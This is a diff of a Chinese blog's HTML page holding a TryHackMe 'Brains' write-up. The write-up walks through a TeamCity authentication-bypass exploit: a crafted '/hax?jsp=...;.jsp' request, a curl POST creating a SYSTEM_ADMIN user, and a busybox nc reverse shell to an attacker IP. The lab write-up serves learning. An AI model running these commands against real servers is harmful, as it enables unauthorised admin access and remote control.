@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="brains">
 <meta property="og:url" content="http://example.com/2025/03/31/brains/index.html">
-<meta property="og:site_name" content="jujub3">
+<meta property="og:site_name" content="juju">
 <meta property="og:description" content="还是太菜了，搞渗透和java吧，这个网站，这也是我的第一篇博客，希望以后也能够坚持下去，加油吧">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/pic/brains/1.png">
@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://example.com/pic/brains/8.png">
 <meta property="article:published_time" content="2025-03-31T11:04:07.000Z">
 <meta property="article:modified_time" content="2025-03-31T14:30:48.601Z">
-<meta property="article:author" content="jujub3">
+<meta property="article:author" content="juju">
 <meta property="article:tag" content="THM">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/pic/brains/1.png">
@@ -138,7 +138,7 @@
 
     <div class="meta">
       <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">jujub3</span>
+        <span class="p-name" itemprop="name">juju</span>
       </span>
       
     <div class="postdate">
@@ -173,35 +173,20 @@
 <p><img src="/pic/brains/2.png" alt="2"></p>
 <p>这里的话，发现了它的一个版本信息：TeamCity 2023.11.3，上网搜索会发现它会有cve</p>
 <p><img src="/pic/brains/3.png" alt="3"></p>
-<pre><code>为了利用此漏洞成功调用经过身份验证的端点/app/rest/server，未经身份验证的攻击者必须在 HTTP(S) 请求期间满足以下三个要求：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">为了利用此漏洞成功调用经过身份验证的端点/app/rest/server，未经身份验证的攻击者必须在 HTTP(S) 请求期间满足以下三个要求：</span><br><span class="line"></span><br><span class="line">请求未经身份验证的资源，生成 404 响应。这可以通过请求不存在的资源来实现，例如：</span><br><span class="line"></span><br><span class="line">/hax</span><br><span class="line"></span><br><span class="line">传递一个名为 jsp 的 HTTP 查询参数，其中包含经过身份验证的 URI 路径的值。这可以通过附加 HTTP 查询字符串来实现，例如：</span><br><span class="line"></span><br><span class="line">?jsp=/app/rest/server</span><br><span class="line"></span><br><span class="line">确保任意 URI 路径以 .jsp 结尾。这可以通过附加 HTTP 路径参数段来实现，例如：</span><br><span class="line"></span><br><span class="line">;.jsp</span><br><span class="line"></span><br><span class="line">结合以上要求，攻击者的URI路径变为：</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line">/hax?jsp=/app/rest/server;.jsp</span><br><span class="line">通过利用身份验证绕过漏洞，我们可以成功调用无需身份验证的已经过身份验证的端点。</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line">C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp</span><br></pre></td></tr></table></figure>
 
-请求未经身份验证的资源，生成 404 响应。这可以通过请求不存在的资源来实现，例如：
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ik &#x27;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">205</span>.<span class="number">41</span>:<span class="number">50000</span>/hax?jsp=/app/rest/server;.jsp&#x27;</span><br></pre></td></tr></table></figure>
 
-/hax
 
-传递一个名为 jsp 的 HTTP 查询参数，其中包含经过身份验证的 URI 路径的值。这可以通过附加 HTTP 查询字符串来实现，例如：
 
-?jsp=/app/rest/server
-
-确保任意 URI 路径以 .jsp 结尾。这可以通过附加 HTTP 路径参数段来实现，例如：
-
-;.jsp
-
-结合以上要求，攻击者的URI路径变为：
-
-复制
-/hax?jsp=/app/rest/server;.jsp
-通过利用身份验证绕过漏洞，我们可以成功调用无需身份验证的已经过身份验证的端点。
-
-复制
-C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp
-</code></pre>
-<pre><code class="language-cmd">curl -ik &#39;http://10.10.205.41:50000/hax?jsp=/app/rest/server;.jsp&#39;
-</code></pre>
 <p><img src="/pic/brains/4.png" alt="4"></p>
 <p>然后调整有效载荷并且添加我们的用户 jujube</p>
-<pre><code class="language-cmd">curl -ik http://10.10.205.41:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\&quot;username\&quot;: \&quot;jujube\&quot;, \&quot;password\&quot;: \&quot;jujube\&quot;, \&quot;email\&quot;: \&quot;0xb0b\&quot;, \&quot;roles\&quot;: &#123;\&quot;role\&quot;: [&#123;\&quot;roleId\&quot;: \&quot;SYSTEM_ADMIN\&quot;, \&quot;scope\&quot;: \&quot;g\&quot;&#125;]&#125;&#125;&quot;
-</code></pre>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ik http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">205</span>.<span class="number">41</span>:<span class="number">50000</span>/hax?jsp=/app/rest/users\;.jsp -X POST -H &quot;Content-<span class="built_in">Type</span>: application/json&quot; --data &quot;&#123;\&quot;username\&quot;: \&quot;jujube\&quot;, \&quot;password\&quot;: \&quot;jujube\&quot;, \&quot;email\&quot;: \&quot;<span class="number">0</span>xb0b\&quot;, \&quot;roles\&quot;: &#123;\&quot;role\&quot;: [&#123;\&quot;roleId\&quot;: \&quot;SYSTEM_ADMIN\&quot;, \&quot;scope\&quot;: \&quot;g\&quot;&#125;]&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <p><img src="/pic/brains/5.png" alt="5"></p>
 <p>然后进行登录。成功了。</p>
 <p>接下来就执行找py打shell了。</p>
@@ -209,13 +194,12 @@ C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.
 <p>然后反弹shell，以获取交互式shell</p>
 <p>这里推荐一个网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
 <p><img src="/pic/brains/image.png" alt="image"></p>
-<pre><code class="language-cmd">busybox nc 10.17.33.100 8888 -e sh
-</code></pre>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">busybox nc <span class="number">10</span>.<span class="number">17</span>.<span class="number">33</span>.<span class="number">100</span> <span class="number">8888</span> -e sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p><img src="/pic/brains/8.png" alt="8"></p>
 <p>sad</p>
-<pre><code class="language-cmd">
-python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>获取交互式shell，然后去用户目录拿flag</p>
 
   </div>
@@ -291,7 +275,7 @@ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
     
     
     2025
-    jujub3
+    juju
   </div>
   <div class="footer-right">
     <nav>
